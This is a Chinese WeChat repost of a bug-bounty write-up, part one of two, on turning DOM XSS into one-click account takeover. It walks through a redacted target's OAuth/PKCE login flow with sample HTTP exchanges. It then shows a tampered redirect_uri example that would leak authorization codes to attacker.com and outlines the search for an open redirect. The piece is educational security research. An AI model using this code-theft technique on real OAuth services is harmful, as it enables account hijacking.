---
title: 如何将DOM XSS升级为一键帐户接管（上集）
url: https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496387&idx=1&sn=3267310a088c189a4c188026cc44e1c1&chksm=e8a5f8a0dfd271b605e165b624d220da44d370f51c3a3b6c5f92a01e05a8a142b205ea14fb8b&scene=58&subscene=0#rd
source: 迪哥讲事
date: 2024-11-22
fetch_date: 2025-10-06T19:17:24.234327
---

# 如何将DOM XSS升级为一键帐户接管（上集）

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/YmmVSe19Qj59vv57oxdq2xUBOCUJHFZZKcnI4RufLj7vfP8nvdhEicEYDj0YLE7RSibxEeIgU7zpKEytvhmaOXgw/0?wx_fmt=jpeg)

# 如何将DOM XSS升级为一键帐户接管（上集）

迪哥讲事

以下文章来源于骨哥说事
，作者骨哥说事

![](http://wx.qlogo.cn/mmhead/Tjnia6K0WAwzfic3VPt0EfMjicnGXzicDLoHEqtz1cP3Iozxf1tSyMxCFNG9Aya8SziaVKhVw7ia6QugE/0)

**骨哥说事**
.

一个喜爱鼓捣的技术宅

|  |
| --- |
| ****声明：****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。 |

#

# 背景介绍

今天，分享国外 Frog Sec 安全团队研究的一个案例，将看似简单的 DOM XSS 升级为复杂的一键式帐户接管，该攻击允许攻击者从应用程序的电子邮件发送合法的登录链接，当（无论是未经身份验证还是经过身份验证的）受害者点击电子邮件中的链接时，攻击者将破坏帐户。故事将带你了解整个思考过程、遇到的障碍以及他们是如何克服这些障碍最终执行全链利用的。由于文章内容较长，故分为上下两部分来讲解。

* 上集：了解 OAuth 登录流程和初始攻击面
* 下集：利用 DOM XSS，并将其升级为一键账户接管

让我们开始吧～

# 了解 OAuth

首先要对目标有一个清晰的认识，由于漏洞披露原则，我们将目标称为 `account.redacted.com` ，将其合作伙伴网站称为 `account.partner.com`。

## 了解应用程序登录流程

在所有功能中，研究人员选择首先测试登录流程，因为这里经常隐藏着严重/高级别漏洞的地方，目标提供了一个单点登录 (SSO) 功能，其它合作伙伴网站也可会集成该功能以方便用户登录。

完整的 OAuth 登录流程如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jkw2Gt2xxhxTC9PLXJj1ic6e4K11wM4TerfsRbNr5ywOg4pqLRqiaGFsbStDcz2gYK9E0Go4Hh4IwpA/640?wx_fmt=png&from=appmsg)

1. 用户通过点击登录`account.partner.com`
2. `account.partner.com` 将通过 xxxxx-pkce cookie 生成并返回 code\_verifier，然后使用 `redirect_uri` 参数将浏览器重定向到 https://account.redacted.com/authorize

```
HTTP/2 302 Found
Set-Cookie: xxxxx-pkce=<code_verifier>; Path=/; Expires=Tue, 26 Mar 2024 11:25:07 GMT
Location: https://account.redacted.com/authorize?redirect_uri=https%3A%2F%2Faccount.partner.com%2Foauth_callback%3Fnext%3D%2Fabc&response_type=code&code_challenge=<code_challenge>
```

具体来说，这个`redirect_uri`像下面这样：

```
https://account.partner.com/oauth_callback?next=/abc
```

如果想了解 code\_verifier 是什么，可以移步至：auth0.com

因此，code\_verifier 是保护授权码的附加层，为了交换访问令牌，还需要与该 authorization\_code 关联的 code\_verifier

3. 用户将被提示进入 `account.redacted.com` SSO 门户的登录页面，如果已登录，则被重定向
4. redirect\_url 将通过先前提供的 redirect\_uri 组合 authorization\_code 来形成

   `redirect_url = redirect_uri + "<authorization_code>"`
5. 然后，浏览器将被重定向到redirect\_url
6. 接下来`account.partner.com` 将能够通过account.redacted.com 的重定向获取授权码

   ```
   https://account.partner.com/oauth_callback?next=/abc&code=
   ```

* next: 使用 authorization\_code 验证成功后要重定向的 URL
* code: 应用程序将从这里获取 authorization\_code
* 重定向 URL 将如下所示：

7. 然后，前端 Javascript 将使用代码在 POST /access\_token 处交换访问令牌

```
POST /access_token HTTP/2
Host: account.partner.com
Cookie: xxxxx-pkce=<code_verifier>
Content-Length: 306
Content-Type: application/x-www-form-urlencoded

code=<authorization_code>&grantType=authorization_code&redirect_url=<redirect_url>
```

8. 注意，code\_verifier 必须与 authorization\_code 相关联，才能成功交换访问令牌，如果code\_verifier和authorization\_code有效，则返回访问令牌并将其设置为cookie

```
HTTP/2 201 Created
Set-Cookie: accessToken=na3+CYtH7TAt+kjebEZgjJ4m37V8Qkxb+GhMw1FlU7gnELDBevy3qGJADAsNfBKSjoujZhgILLU+M8n49DrRd8+yZS1Jco2M04KWqbp64B8ASHPM6llTqZc=; Domain=partner.com
```

9. 最后，应用程序会将页面重定向到步骤 3 中 oauth\_callback 端点的下一个参数处的 URL，即重定向到`https://account.partner.com/abc`

## 教科书式的 OAuth 攻击

![img](https://gitee.com/bugchong/images/raw/master/uPic/Untitled 1.png)

第一种方法是篡改登录流程第 3 步的 redirect\_uri 参数，例如：

```
https://account.redacted.com/authorize?redirect_uri=https://attacker.com&response_type=code
```

然后将这个被篡改的链接发送给受害者。如果登录流程成功，代码将在第7步附加到 `https://attacker.com` 域，从而攻击者可以获得授权代码。

```
https://attacker.com/?code=<authorization_code>
```

然而，事情并没有那么简单。

应用程序会拒绝任何非`account.partner.com`域的 `redirect_uri` ，并且仅接受 `http` 和 `https` 协议。幸运的是，仍然可以将 URL 路径修改为我们想要的任何内容，例如：

```
https://account.redacted.com/authorize?redirect_uri=https://account.partner.com/<anything_here>&response_type=code
```

利用此漏洞的另一种方法是在 `https://account.partner.com` 上找到开放重定向，以便可以将授权代码重定向到攻击者的服务器。

在登录流程的第 10 步中，有提到在 `https://account.partner.com/oauth_callback?next=` 处有另一个重定向。有趣的是，没有任何 `302` 或来自服务器的重定向状态代码，这表明应用程序正在使用 JavaScript 进行重定向。

让我们检查一下重定向接收器。

【未完待续…】

**如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款**

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5EMr3X76qdKBrhIIkBlVVyuiaiasseFZ9LqtibyKFk7gXvgTU2C2yEwKLaaqfX0DL3eoH6gTcNLJvDQ/640?wx_fmt=png&from=appmsg)

## 往期回顾

[一款bp神器](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495880&idx=1&sn=65d42fbff5e198509e55072674ac5283&chksm=e8a5faabdfd273bd55df8f7db3d644d3102d7382020234741e37ca29e963eace13dd17fcabdd&scene=21#wechat_redirect)

[ssrf绕过新思路](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495841&idx=1&sn=bbf477afa30391b8072d23469645d026&chksm=e8a5fac2dfd273d42344f18c7c6f0f7a158cca94041c4c4db330c3adf2d1f77f062dcaf6c5e0&scene=21#wechat_redirect)

[一个辅助测试ssrf的工具](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496380&idx=1&sn=78c0c4c67821f5ecbe4f3947b567eeec&chksm=e8a5f8dfdfd271c935aeb4444ea7e928c55cb4c823c51f1067f267699d71a1aad086cf203b99&scene=21#wechat_redirect)

[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)

[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)

[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

迪哥讲事

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过